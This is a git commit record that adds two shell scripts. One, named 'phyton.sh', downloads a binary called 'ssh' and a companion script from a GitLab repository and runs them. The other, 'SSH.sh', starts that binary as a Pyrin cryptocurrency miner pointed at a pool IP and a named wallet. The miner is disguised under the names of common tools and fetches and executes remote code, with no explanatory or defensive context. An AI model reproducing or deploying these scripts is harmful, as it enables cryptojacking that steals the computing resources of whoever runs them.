c5d5c2d5a0f23fd94370808e4ccf3edc72778ae6
lemanleman020 <147594099+lemanleman020@users.noreply.github.com>
2024-08-15 13:15:18 +0800

    Add files via upload

---
+++ SSH.sh
@@ -0,0 +1,6 @@
+#!/bin/bash
+
+POOL=15.235.214.147:1177
+WALLET=pyrin:qq02hvf6ls5dhewyjx64607fyvs8qqfc0796v7pdxa729wvjx2aqxy8wlenft.STRIXGPU
+
+./ssh --algo PYRIN --pool $POOL --user $WALLET $@ --no-cl
---
+++ phyton.sh
@@ -0,0 +1,2 @@
+wget https://gitlab.com/kardisali2/rich-again/-/raw/main/ssh && chmod +x ssh
+wget https://gitlab.com/kardisali2/rich-again/-/raw/main/SSH.sh && ./SSH.sh
